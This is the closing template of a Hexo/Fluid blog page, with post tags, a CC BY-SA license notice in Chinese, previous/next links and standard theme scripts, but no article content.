                  <div class="post-meta mr-3">
                    <i class="iconfont icon-category"></i>
                    
                      <a class="hover-with-bg" href="/categories/not-a-big-deal/">not a big deal</a>
                    
                  </div>
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/wp-orz/">wp orz</a>
                    
                  </div>
                
              </div>
              
                <p class="note note-warning">
                  
                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
                  
                </p>
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/03/03/java/">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">java</span>
                        <span class="visible-mobile">Previous</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/01/13/sql/">
                        <span class="hidden-mobile">sql</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
    

    
  </main>

  <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
  </div>
  

  

  
</footer>


  <!-- SCRIPTS -->
  
  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  <script  src="/js/local-search.js" ></script>



  
    <script  src="/js/img-lazyload.js" ></script>
  



  



  
    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
  
  
    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
  
  
    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
  






  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var title = document.getElementById('subtitle').title;
      
      typing(title)
      
    })(window, document);
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>


</body>
</html>
